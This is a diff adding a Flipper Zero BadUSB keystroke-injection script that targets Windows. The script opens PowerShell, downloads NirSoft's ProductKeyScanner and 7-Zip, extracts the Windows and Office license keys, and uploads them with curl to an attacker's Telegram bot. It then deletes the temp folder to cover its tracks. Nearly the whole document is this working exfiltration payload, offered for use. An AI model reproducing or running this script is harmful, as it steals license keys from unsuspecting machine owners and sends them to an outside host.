@@ -1,0 +1,44 @@
+REM Title: Windows License KEY Scanner
+REM Author: shp3x
+REM Description: Extracts license key from Windows and MS Office.
+REM Original: https://github.com/shp3x/Flipper-Zero/blob/main/BadUSB/WindowsKeyScanner.txt
+REM Target:	Windows
+REM
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING $token='YOUR BOT TOKEN'
+ENTER
+STRING $user_id='YOUR TELEGRAM ID'
+ENTER
+DELAY 1000
+STRING Remove-Item \temp -Recurse -Force -Confirm:$false ; mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/product_key_scanner.html'} -Uri http://www.nirsoft.net/utils/productkeyscanner.zip -OutFile keys.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e keys.zip
+ENTER
+DELAY 1000
+STRING .\ProductKeyScanner.exe
+DELAY 500
+ENTER
+DELAY 1000
+ENTER
+DELAY 5000
+CTRL A
+CTRL S
+DELAY 500
+STRING LicenseKeys.json
+TAB
+STRING json
+ENTER
+DELAY 1000
+ALT F4
+DELAY 1000
+STRING curl.exe -F document=@"LicenseKeys.json" https://api.telegram.org/bot$token/sendDocument?chat_id=$user_id"&"caption='<b>New+keys+received!</b>'"&"parse_mode=HTML
+ENTER
+DELAY 500
+STRING cd \
+ENTER
+STRING Remove-Item \temp -Recurse -Force -Confirm:$false ; mkdir \temp ;
+ENTER
+STRING EXIT
+ENTER
